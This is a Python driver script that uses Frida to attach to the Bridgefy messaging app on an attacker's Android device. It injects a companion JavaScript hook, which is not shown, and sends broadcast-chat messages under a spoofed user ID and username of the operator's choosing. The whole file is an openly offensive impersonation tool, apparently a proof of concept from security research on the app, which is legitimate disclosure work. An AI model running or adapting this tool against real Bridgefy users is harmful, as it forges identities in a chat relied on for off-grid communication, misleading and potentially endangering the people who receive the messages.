#!/usr/bin/env python3

import argparse
import frida
import sys

from pathlib import Path


def parse_args():
    parser = argparse.ArgumentParser(description='Impersonation in the broadcast chat in Bridgefy.')
    parser.add_argument('phoneid', type=str, help='The ADB ID of the attacker\'s device.')
    parser.add_argument('appid', type=str, help='The ID of the Bridgefy app.')
    parser.add_argument('--userid', type=str, required=False, help='The userId the broadcast is sent from.')
    parser.add_argument('--username', type=str, required=False, help='The username the broadcast is sent from.')
    parser.add_argument('--message', type=str, required=False, help='The message in the payload of the broadcast.')
    return parser.parse_args()


def on_message(message, data):
    if message['type'] == 'send':
        print(message['payload'])
    else:
        print(message)


def some_or_input(value, prompt):
    if value is None:
        return input(prompt)
    else:
        return value


def main():
    args = parse_args()

    process = frida.get_device_manager().get_device(args.phoneid).attach(args.appid)

    scriptname = Path(__file__).parent / 'broadcast-impersonation.js'
    with open(scriptname) as f:
        script = process.create_script(f.read())

    script.on('message', on_message)
    script.load()

    script.post({
        'type': 'params',
        'userid': some_or_input(args.userid, 'userid: '),
        'username': some_or_input(args.username, 'username: '),
        'message': some_or_input(args.message, 'message: '),
    })

    sys.stdin.read()


if __name__ == '__main__':
    main()
